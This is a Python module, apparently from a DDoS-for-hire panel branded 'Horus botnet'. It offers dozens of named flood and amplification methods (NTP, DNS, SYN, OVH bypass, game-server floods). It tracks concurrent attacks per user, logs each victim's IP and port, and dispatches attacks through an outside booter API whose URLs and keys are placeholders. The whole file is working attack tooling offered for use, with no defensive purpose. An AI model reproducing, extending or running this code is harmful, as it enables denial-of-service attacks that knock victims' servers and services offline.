import requests
from termcolor import colored
import Horus
import os
from datetime import timedelta
import datetime
import time
import threading
import pytz

active_attacks = {}
current_attacks = 0 

L7_METHODS = [
    "TLSV2", "HTTP-RAW", "HTTPS", "BYPASS", 
    "TLSV3", "BROWSE"
]

L4_METHODS = [
    "DNS", "NTP", "SADP", "STUN", "WSD", "ARD", "COAP", 
    "DISCORD", "UDP-PLAIN", "GMOD", "TS3", "UDP-SOURCE", 
    "OPENVPN", "TFO", "RAW-SOCKET", "SYNMIX", "TCP-TLS", 
    "ACK", "OVHTCP", "RST", "BGP", "WRA", "TCP-WEB", 
    "TCP-REFLECT", "TCP-MIDDLEBOX", "UDP-VSE", "RAKNET", 
    "CS16", "FIVEM", "SOCKETV2", "SSH-SOCKET", "HOLLOW-PURPLE", "RAND"
]

def attack_sent_banner(method, victim, port, time, conc, username, ip):
    print(f"\n{colored(' [+] Telegram:', 'green')} {colored('t.me/HorusBotnet', 'red')}")
    print(colored(f" [+] Attack sent! {colored('Method:', 'green')} {colored(method, 'red')} {colored('Target:', 'green')} {colored(victim, 'red')} {colored('Port:', 'green')} {colored(port, 'red')}, {colored('Time:', 'green')} {colored(time, 'red')} {colored('Concs:', 'green')} {colored(conc, 'red')}\n", 'green'))

def send_attack(method, victim, port, time, conc, username_client, ip_client, user_concurrents):
    validate_method(method, victim, port, time, conc, username_client, ip_client, user_concurrents)

def view_current_attacks():
    if current_attacks == 0:
        print(colored(f"\n [+] Concurrents Used: {colored(current_attacks, 'red')}\n", 'green'))
    else:
        print(colored(f"\n [+] Concurrents Used: {colored(current_attacks, 'red')}", 'green'))
    if active_attacks:
        print(colored("\n [+] Active Attacks:\n", 'green'))
        counter = 0
        for victim, attacks in active_attacks.items():
            for attack in attacks:
                expiration_time = attack["expiration"] + timedelta(hours=1)
                formatted_expiration_time = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
                concurrents = attack["concurrents"]
                print(colored(f"     [+] Attack {colored(counter, 'red')} {colored("Target:", 'green')} {colored(victim, 'red')} {colored("Concs:", 'green')} {colored(concurrents, 'red')} {colored("Expiration:", 'green')} {colored(formatted_expiration_time, 'red')}", 'green',))
                counter += 1
        print("\n")
    else:
        print(colored(" [+] No active attacks.\n", 'green'))

def attacks_logs(method, victim, port, time, conc, username, ip):
    logs_directory = "logs"
    archivo_log = os.path.join(logs_directory, "ATTACKS.log")
    
    tz = pytz.timezone('Europe/Madrid')
    timestamp = datetime.datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S')
    
    if not os.path.exists(archivo_log):
        with open(archivo_log, "w") as log_file:
            log_file.write("| Date | User IP | User | Method | Target IP | Target port | Attack Time | Concurrents Used \n")
    
    with open(archivo_log, "a") as log_file:
        log_file.write(f"| {timestamp} | {ip} | {username} | {method} | {victim} | {port} | {time} | {conc}\n")

def check_active_attacks():
    global current_attacks, active_attacks
    while True:
        now = datetime.datetime.now()
        for victim in list(active_attacks.keys()):
            attacks = active_attacks[victim]
            remaining_attacks = []
            for attack in attacks:
                if now > attack["expiration"]:
                    current_attacks -= attack["concurrents"]
                else:
                    remaining_attacks.append(attack)
            
            if remaining_attacks:
                active_attacks[victim] = remaining_attacks
            else:
                del active_attacks[victim]
        
        time.sleep(1)


def validate_method(method, victim, port, time, conc, username, ip, user_concurrents):
    global current_attacks, active_attacks
    method = method.strip().upper()

    try:
        duration = int(time)
        expiration_time = datetime.datetime.now() + timedelta(seconds=duration)
    except ValueError:
        print(colored(" [!] Invalid time value", 'red'))
        return
    
    if current_attacks + int(conc) <= int(user_concurrents):
        if method in (m.upper() for m in L7_METHODS + L4_METHODS):
            attacks_logs(method, victim, port, time, conc, username, ip)
            
            if victim not in active_attacks:
                active_attacks[victim] = []
            active_attacks[victim].append({"expiration": expiration_time, "concurrents": int(conc)})
            
            if method in (m.upper() for m in L7_METHODS):
                send_L7(method, victim, port, time, conc)
                attack_sent_banner(method, victim, port, time, conc, username, ip)
            else:
                send_L4(method, victim, port, time, conc)
                attack_sent_banner(method, victim, port, time, conc, username, ip)
            
            current_attacks += int(conc)
        else:
            print(colored(f" [!] The method '{method}' is invalid.", 'red'))
    else:
        print(colored(f"\n [!] No more concurrents to use. Your concurrents: {user_concurrents}, Running attacks: {current_attacks}", "red"))

    
def send_L4(method, victim, port, time, conc):
    url = "L4 API URL HERE"
    params = {
        "api_key": "YOUR API KEY HERE",
        "host": f"{victim}",
        "port": f"{port}",
        "method": f"{method}",
        "duration": f"{time}",
        "slots": f"{conc}"
    }

    try:
        response = requests.get(url, params=params)

    except requests.exceptions.RequestException as e:
        print(colored(f" [!] Error try again or contact support", 'red'))

def send_L7(method, victim, port, time, conc):
    url = "L7 API URL HERE"
    params = {
        "api_key": "API KEY HERE",
        "host": f"{victim}",
        "port": f"{port}",
        "method": f"{method}",
        "duration": f"{time}",
        "slots": f"{conc}"
    }

    try:
        response = requests.get(url, params=params)
    except requests.exceptions.RequestException as e:
        print(colored(f" [!] Error try again or contact support", 'red'))

threading.Thread(target=check_active_attacks, daemon=True).start()
